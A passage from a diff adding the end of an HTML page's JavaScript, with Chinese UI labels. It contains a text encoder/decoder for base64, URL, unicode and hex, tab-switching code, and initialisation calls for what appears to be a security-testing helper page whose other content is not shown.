+    if(mode==='b64') r=btoa(unescape(encodeURIComponent(v)));
+    if(mode==='b64d') r=decodeURIComponent(escape(atob(v)));
+    if(mode==='url') r=encodeURIComponent(v);
+    if(mode==='urld') r=decodeURIComponent(v);
+    if(mode==='uni') r=v.split('').map(ch=>'\\u'+('0000'+ch.charCodeAt(0).toString(16)).slice(-4)).join('');
+    if(mode==='hex') r=v.split('').map(ch=>ch.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+  }catch(e){ r='[错误] '+e.message; }
+  document.getElementById('encOut').textContent=r;
+}
+
+/* ---- Tab ---- */
+document.querySelectorAll('.tab').forEach(t=>{
+  t.onclick=()=>{
+    document.querySelectorAll('.tab').forEach(x=>x.classList.remove('on'));
+    document.querySelectorAll('.pane').forEach(x=>x.classList.remove('on'));
+    t.classList.add('on');
+    document.getElementById('p-'+t.dataset.p).classList.add('on');
+    window.scrollTo(0,0);
+  };
+});
+
+function rerender(){ renderFp(); renderVer(); renderPay(); renderFlow(); renderTools(); renderSh(); toast('参数已应用'); }
+function resetDefault(){
+  for(const k in DEF){ const e=document.getElementById('g_'+k); if(e) e.value=DEF[k]; }
+  rerender();
+}
+
+/* ---- 初始化 ---- */
+buildChips('fp',FP,true);
+buildChips('ver',VER,true);
+buildChips('pay',PAY,false);
+buildChips('flow',FLOW,false);
+buildChips('tool',TOOLS,true);
+renderFp(); renderVer(); renderTools(); renderSh();
+</script>
+</body>
+</html>
